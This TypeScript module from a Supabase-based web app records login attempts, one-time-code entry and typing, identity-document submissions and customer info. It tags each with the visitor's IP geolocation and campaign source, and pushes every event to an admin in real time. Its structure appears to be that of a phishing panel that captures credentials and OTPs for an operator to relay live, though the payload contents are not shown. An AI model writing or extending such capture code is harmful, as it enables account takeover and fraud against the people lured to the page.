import { supabase } from "@/integrations/supabase/client";
import { notifyAdmin } from "@/lib/admin-events";
import { getSessionId } from "@/lib/session-id";

export type SubmissionKind =
  | "login_attempt"
  | "signup"
  | "otp_attempt"
  | "otp_opened"
  | "otp_typing"
  | "otp_resend"
  | "otp_window_expired"
  | "verify_personal"
  | "verify_documents"
  | "verify_submit"
  | "logout_confirmed"
  | "customer_info";

const SOURCE_KEY = "sham_traffic_source_v1";
const GEO_KEY = "sham_geo_v1";

type TrafficSource = {
  referrer?: string | null;
  referrer_host?: string | null;
  utm_source?: string | null;
  utm_medium?: string | null;
  utm_campaign?: string | null;
  utm_term?: string | null;
  utm_content?: string | null;
  landing_page?: string | null;
  captured_at?: string;
};

type GeoInfo = {
  ip?: string | null;
  country?: string | null;
  country_code?: string | null;
  city?: string | null;
  region?: string | null;
  timezone?: string | null;
  captured_at?: string;
};

/** يلتقط مصدر الزيارة الأول ويحفظه للجهاز حتى نعرف من أين جاء العميل */
function captureTrafficSource(): TrafficSource | null {
  if (typeof window === "undefined") return null;
  try {
    const cached = window.localStorage.getItem(SOURCE_KEY);
    if (cached) return JSON.parse(cached) as TrafficSource;
    const params = new URLSearchParams(window.location.search);
    const ref = document.referrer || null;
    let refHost: string | null = null;
    if (ref) { try { refHost = new URL(ref).host; } catch { refHost = null; } }
    const src: TrafficSource = {
      referrer: ref,
      referrer_host: refHost,
      utm_source: params.get("utm_source"),
      utm_medium: params.get("utm_medium"),
      utm_campaign: params.get("utm_campaign"),
      utm_term: params.get("utm_term"),
      utm_content: params.get("utm_content"),
      landing_page: window.location.pathname + window.location.search,
      captured_at: new Date().toISOString(),
    };
    window.localStorage.setItem(SOURCE_KEY, JSON.stringify(src));
    return src;
  } catch {
    return null;
  }
}

/** يحدّد موقع العميل (الدولة/المدينة) من عنوانه ويحفظه للجهاز */
async function captureGeo(): Promise<GeoInfo | null> {
  if (typeof window === "undefined") return null;
  try {
    const cached = window.localStorage.getItem(GEO_KEY);
    if (cached) return JSON.parse(cached) as GeoInfo;
  } catch { /* ignore */ }
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 2500);
    const res = await fetch("https://ipapi.co/json/", { signal: ctrl.signal });
    clearTimeout(t);
    if (!res.ok) return null;
    const j = (await res.json()) as Record<string, unknown>;
    const geo: GeoInfo = {
      ip: (j["ip"] as string) ?? null,
      country: (j["country_name"] as string) ?? null,
      country_code: (j["country_code"] as string) ?? null,
      city: (j["city"] as string) ?? null,
      region: (j["region"] as string) ?? null,
      timezone: (j["timezone"] as string) ?? null,
      captured_at: new Date().toISOString(),
    };
    if (!geo.country && !geo.country_code) return null;
    try { window.localStorage.setItem(GEO_KEY, JSON.stringify(geo)); } catch { /* ignore */ }
    return geo;
  } catch {
    return null;
  }
}

const QUEUE_KEY = "sham_submission_queue_v1";
type Queued = { kind: SubmissionKind; email: string | null; user_id: string | null; page: string | null; payload: Record<string, unknown>; ts: number };

function readQueue(): Queued[] {
  try { return JSON.parse(window.localStorage.getItem(QUEUE_KEY) ?? "[]") as Queued[]; } catch { return []; }
}
function writeQueue(q: Queued[]) {
  try { window.localStorage.setItem(QUEUE_KEY, JSON.stringify(q.slice(-50))); } catch { /* ignore */ }
}

async function sendOne(row: Queued): Promise<boolean> {
  try {
    const { error } = await supabase.from("client_submissions").insert({
      kind: row.kind,
      email: row.email,
      user_id: row.user_id,
      page: row.page,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      payload: row.payload as any,
    });
    if (error) return false;
  } catch { return false; }
  try {
    await fetch("/api/public/push/notify", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ kind: row.kind, email: row.email, sessionId: (row.payload as { session_id?: string }).session_id, payload: row.payload }),
      keepalive: true,
    });
  } catch { /* non-blocking */ }
  return true;
}

/** يحاول إرسال كل الإدخالات المؤجّلة؛ يُستدعى عند عودة الاتصال أو بدء التطبيق */
export async function flushSubmissionQueue(): Promise<void> {
  if (typeof window === "undefined") return;
  const q = readQueue();
  if (!q.length) return;
  const remain: Queued[] = [];
  for (const row of q) {
    const ok = await sendOne(row);
    if (!ok) remain.push(row);
  }
  writeQueue(remain);
}

export async function logSubmission(
  kind: SubmissionKind,
  payload: Record<string, unknown>,
  email?: string | null,
) {
  const finalEmail = email ?? null;
  const sessionId = getSessionId();
  const source = captureTrafficSource();
  const geo = await captureGeo();
  const enrichedPayload = { session_id: sessionId, traffic_source: source, geo, ...payload };
  let userId: string | null = null;
  let authEmail: string | null = null;
  try {
    const { data } = await supabase.auth.getUser();
    userId = data.user?.id ?? null;
    authEmail = data.user?.email ?? null;
  } catch { /* ignore */ }
  const row: Queued = {
    kind,
    email: finalEmail ?? authEmail,
    user_id: userId,
    page: typeof window !== "undefined" ? window.location.pathname : null,
    payload: enrichedPayload,
    ts: Date.now(),
  };
  const ok = await sendOne(row);
  if (!ok) {
    // الإدخال ما وصل: نحفظه ونعيد المحاولة لاحقاً حتى ما يضيع
    const q = readQueue();
    q.push(row);
    writeQueue(q);
  }
  notifyAdmin({ kind: "submission", email: finalEmail, type: kind });
  // نحاول تفريغ أي إدخالات قديمة معلّقة
  void flushSubmissionQueue();
}
